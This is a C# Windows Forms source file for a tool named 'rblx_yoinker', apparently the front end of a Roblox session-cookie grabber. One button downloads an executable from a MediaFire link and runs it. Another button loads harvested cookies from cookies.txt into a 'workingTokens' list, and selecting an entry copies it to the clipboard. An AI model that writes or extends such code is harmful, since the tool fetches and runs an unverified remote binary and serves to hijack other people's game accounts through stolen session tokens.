using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;

namespace rblx_yoinker
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        private Process process;

        private bool started = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button2.FlatStyle = FlatStyle.Flat;
            start.FlatStyle = FlatStyle.Flat;
            button1.FlatStyle = FlatStyle.Flat;

            button1.FlatAppearance.BorderSize = 0;
            button2.FlatAppearance.BorderSize = 0;
            start.FlatAppearance.BorderSize = 0;
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Clipboard.SetText(workingTokens.SelectedItem.ToString());
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(!File.Exists(Directory.GetCurrentDirectory() + "yoinker.exe"))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://download1580.mediafire.com/ck4zntmyljcg/6gzqk5e0ofh07q5/rblx-yoinker.exe", "yoinker.exe");
                }
            }

            worker.RunWorkerAsync();
            worker.WorkerSupportsCancellation = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(started)
            {
                worker.CancelAsync();
                process.CloseMainWindow();
                started = false;
            }
        }

        private void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            process = new Process();
            process.StartInfo = new ProcessStartInfo("yoinker.exe");
            process.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            process.StartInfo.Arguments = "";
            process.Start();
            started = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(started)
            {
                worker.CancelAsync();
                process.CloseMainWindow();
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (File.Exists(Directory.GetCurrentDirectory() + "/cookies.txt"))
            {
                workingTokens.Items.Clear();

                foreach (string line in System.IO.File.ReadLines(Directory.GetCurrentDirectory() + "/cookies.txt"))
                {
                    workingTokens.Items.Add(line);
                }
            }
        }
    }
}
